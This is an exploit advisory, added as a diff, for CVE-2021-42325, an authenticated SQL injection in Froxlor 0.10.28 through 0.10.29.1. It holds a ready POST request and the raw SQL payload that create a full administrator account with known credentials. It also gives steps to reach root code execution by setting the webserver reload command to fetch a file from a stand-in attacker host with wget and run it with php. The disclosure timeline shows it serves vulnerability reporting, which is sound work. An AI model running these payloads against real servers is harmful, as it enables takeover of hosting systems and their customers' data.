@@ -1,0 +1,91 @@
+# Exploit Title: Froxlor 0.10.29.1 - SQL Injection (Authenticated)
+# Exploit Author: Martin Cernac
+# Date: 2021-11-05
+# Vendor: Froxlor (https://froxlor.org/)
+# Software Link: https://froxlor.org/download.php
+# Affected Version: 0.10.28, 0.10.29, 0.10.29.1
+# Patched Version: 0.10.30
+# Category: Web Application
+# Tested on: Ubuntu
+# CVE: 2021-42325
+
+# 1. Technical Description:
+#
+# Froxlor 0.10.28 and 0.10.29.x are affected by an SQL Injection from the authenticated customer panel. This allows an attacker to escalate privilege by creating a Froxlor administrator account and use it to get Remote Code Execution as root on the target machine.
+#
+# 1.1 Pre-requisites
+#  - Access to a customer account
+#  - Ability to specify database name when creating a database
+#    - Feature only availible from 0.10.28 onward and must be manually enabled
+
+
+# 2. Proof Of Concept (PoC):
+#
+# The following is a walkthrough of privilege escalation from a mere customer to an admin and achieving RCE as root
+#
+# 2.1 Privilege Escalation
+#
+# - Sign into Froxlor as a customer
+# - View your databases
+# - Create a database
+# - Put your payload into the "User/Database name" field (if enabled)
+# - Application will error out however your SQL query will be executed
+#
+# The following is a POST request example of running the payload provided, resulting in an administrator account being created
+---
+POST /froxlor/customer_mysql.php?s=fdbdf63173d0b332ce13a148476499b2 HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 448
+
+s=fdbdf63173d0b332ce13a148476499b2&page=mysqls&action=add&send=send&custom_suffix=%60%3Binsert+into+panel_admins+%28loginname%2Cpassword%2Ccustomers_see_all%2Cdomains_see_all%2Ccaneditphpsettings%2Cchange_serversettings%29+values+%28%27x%27%2C%27%245%24ccd0bcdd9ab970b1%24Hx%2Fa0W8QHwTisNoa1lYCY4s3goJeh.YCQ3hWqH1ZUr8%27%2C1%2C1%2C1%2C1%29%3B--&description=x&mysql_password=asdasdasdasdasdasdwire&mysql_password_suggestion=oyxtjaihgb&sendinfomail=0
+---
+#
+# 2.2 Remote Code Execution
+#
+# To achieve RCE as root:
+#
+# - Sign into Froxlor as the newly created admin account (payload example creds are x:a)
+# - Go to System Settings
+# - Go to Webserver settings
+# - Adjust "Webserver reload command" field to a custom command
+# - The command must not contain any of the following special characters: ;|&><`$~?
+#   - For details, see "safe_exec" function in lib/Froxlor/FileDir.php
+#   - For example commands see Payloads 4.2 section
+# - Trigger configuration file rebuild
+#   - Use menu item "Rebuild config files"
+# - Await a root cron job to execute your command
+
+
+# 3. Vulnerable resources and parameters
+# /customer_mysql.php (POST field: custom_suffix)
+
+
+# 4. Payloads
+#
+# 4.1 SQL Injection payload
+#  The following payload creates a new Froxlor admin with full access to all customers and the server configuration
+#  The credentials are:
+#   - username: x
+#   - password: a
+#
+# `;insert into panel_admins (loginname,password,customers_see_all,domains_see_all,caneditphpsettings,change_serversettings) values ('x','$5$ccd0bcdd9ab970b1$Hx/a0W8QHwTisNoa1lYCY4s3goJeh.YCQ3hWqH1ZUr8',1,1,1,1);--
+#
+#
+# 4.2 Remote Code Execution payload
+#  Two part payload:
+#  - wget http://attacker.com/malicious.txt -O /runme.php
+#  - php /runme.php
+
+
+# 5. Timeline
+# 2021-10-11 Discovery
+# 2021-10-11 Contact with developer
+# 2021-10-11 Patch issued but no release rolled out
+# 2021-10-12 Reserved CVE-2021-42325
+# 2021-11-05 Fix release rolled out
+# 2021-11-07 Public disclosure
+
+
+# 6. References:
+# https://github.com/Froxlor/Froxlor/releases/tag/0.10.30
